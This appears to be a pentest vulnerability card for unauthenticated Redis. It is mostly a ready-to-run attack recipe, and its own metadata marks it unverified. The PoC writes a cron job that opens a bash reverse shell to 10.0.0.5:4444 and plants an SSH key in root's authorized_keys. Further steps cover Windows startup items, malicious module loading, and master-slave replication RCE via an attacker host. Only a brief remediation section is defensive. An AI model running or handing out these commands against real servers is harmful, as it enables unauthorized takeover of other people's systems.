---
title: Redis Unauthenticated (File Write / Module Load / Master-Slave Replication)
cve: No single CVE (CVE-2022-0543 is a Debian special case)
severity: critical
cvss: 9.8
product: Redis
versions: Any (no auth + exposed)
ports: 6379, 6380
keywords: redis, unauth, config-set, rdb, cron, module-load, replica
verified: false
sources: Compiled from public sources (business-logic / implementation / misconfiguration classes, no CVE; see references below)
---

## Fingerprint

```bash
redis-cli -h target -p 6379 INFO
redis-cli -h target -p 6379 CONFIG GET dir
```

Returning `redis_version` means unauthenticated.

## Prerequisites

- 6379 reachable and `requirepass` empty; the Redis process user can write to the target directory.

## PoC

```bash
# 1) Check
redis-cli -h target CONFIG GET dir
redis-cli -h target CONFIG GET dbfilename

# 2) Write a crontab (Linux)
redis-cli -h target CONFIG SET dir /var/spool/cron/
redis-cli -h target CONFIG SET dbfilename root
redis-cli -h target SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n\n"
redis-cli -h target SAVE

# 3) Write an SSH key
redis-cli -h target CONFIG SET dir /root/.ssh/
redis-cli -h target CONFIG SET dbfilename authorized_keys
redis-cli -h target SET x "\n\nssh-rsa AAAA... \n\n"
redis-cli -h target SAVE
```

## Exploitation steps

1. Use `INFO` to confirm the version and that `CONFIG` is available (when some versions disable `CONFIG`, use `SLAVEOF`/`MODULE`).
2. Before writing files, run `CONFIG GET dir` to confirm a writable directory; after `SAVE`, verify the file (`redis-cli GET` or read it directly).
3. Windows targets: write a startup item under `C:\Windows\Temp\` or `C:\Users\<u>\.ssh\authorized_keys`.
4. Load a module (4.x+): `MODULE LOAD /path/exp.so` → `system.exec 'id'` (RedisModules-ExecuteCommand).
5. Master-slave replication RCE: `SLAVEOF attacker 6379` + `MODULE LOAD`, the most reliable option when outbound connectivity is unavailable and file writes are restricted.
6. Cleanup: restore with `CONFIG SET dir /tmp`, delete written files, `MODULE UNLOAD`.

## Remediation and mitigation

- Set `requirepass` + `rename-command CONFIG ""`; keep 6379 internal-only; `protected-mode yes` and do not bind 0.0.0.0.

## References

- Redis security recommendations; CVE-2022-0543 (Lua sandbox escape in Debian packaging).
